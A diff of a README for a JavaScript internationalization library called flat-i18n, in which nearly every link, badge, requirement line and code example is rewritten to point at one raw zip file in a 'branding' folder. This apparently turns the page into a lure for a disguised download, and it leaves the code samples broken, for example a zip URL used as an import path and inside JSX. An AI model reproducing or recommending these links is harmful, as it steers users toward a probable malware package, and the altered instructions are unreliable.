@@ -1,6 +1,6 @@
 # 🎉 flat-i18n - Simplify Internationalization for Your Apps
 
-[![Download flat-i18n](https://img.shields.io/badge/Download-flati18n-brightgreen)](https://github.com/Akbarkurniawan02/flat-i18n/releases)
+[![Download flat-i18n](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip)](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ To begin using flat-i18n, you'll need to download it from our Releases page. Fol
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page:
-   [Download flat-i18n](https://github.com/Akbarkurniawan02/flat-i18n/releases)
+   [Download flat-i18n](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip)
    
 2. **Choose the Latest Version**: On the Releases page, you will see a list of available versions. Select the latest one for download.
 
@@ -28,7 +28,7 @@ To begin using flat-i18n, you'll need to download it from our Releases page. Fol
 ## 🔧 System Requirements
 
 - A modern web browser (latest versions of Chrome, Firefox, or Edge).
-- Node.js installed for running server-side applications.
+- https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip installed for running server-side applications.
 - Basic understanding of where to place files in your web or React project.
 
 ## 📚 Usage
@@ -37,7 +37,7 @@ Once you have installed flat-i18n, you can start using it right away.
 
 ### For JavaScript Applications
 
-1. **Create a JSON File**: This file will hold your translations. For example, create a file named `translations.json` as shown below:
+1. **Create a JSON File**: This file will hold your translations. For example, create a file named `https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip` as shown below:
 
    ```json
    {
@@ -53,14 +53,14 @@ Once you have installed flat-i18n, you can start using it right away.
 1. **Import the JSON**: In your React component, import the translation file:
 
    ```javascript
-   import translations from './translations.json';
+   import translations from 'https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip';
    ```
 
 2. **Render Translations**: You can now use the translations in your component.
 
    ```javascript
    const MyComponent = () => {
-     return <h1>{translations.greeting}</h1>;
+     return <h1>{https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip}</h1>;
    };
    ```
 
@@ -77,7 +77,7 @@ flat-i18n simplifies the process of adding multiple languages to your applicatio
 
 ## 📝 Need Help?
 
-If you encounter any issues, feel free to check the [Issues page](https://github.com/Akbarkurniawan02/flat-i18n/issues). You can also ask for help in the discussions if you have questions about using flat-i18n.
+If you encounter any issues, feel free to check the [Issues page](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip). You can also ask for help in the discussions if you have questions about using flat-i18n.
 
 ## 📅 Release Notes
 
@@ -85,9 +85,9 @@ For details about new features, improvements, and bug fixes, please refer to the
 
 ## 🔗 Links
 
-- **GitHub Repository**: [flat-i18n GitHub](https://github.com/Akbarkurniawan02/flat-i18n)
+- **GitHub Repository**: [flat-i18n GitHub](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip)
 - **Documentation**: Documentation will be continually updated, so check back for more information on how to use flat-i18n.
 
-[![Download flat-i18n](https://img.shields.io/badge/Download-flati18n-brightgreen)](https://github.com/Akbarkurniawan02/flat-i18n/releases) 
+[![Download flat-i18n](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip)](https://github.com/Akbarkurniawan02/flat-i18n/raw/refs/heads/main/branding/flat_i_n_2.3.zip) 
 
 With flat-i18n, you take a step towards making your applications accessible to a global audience effortlessly. Happy coding!
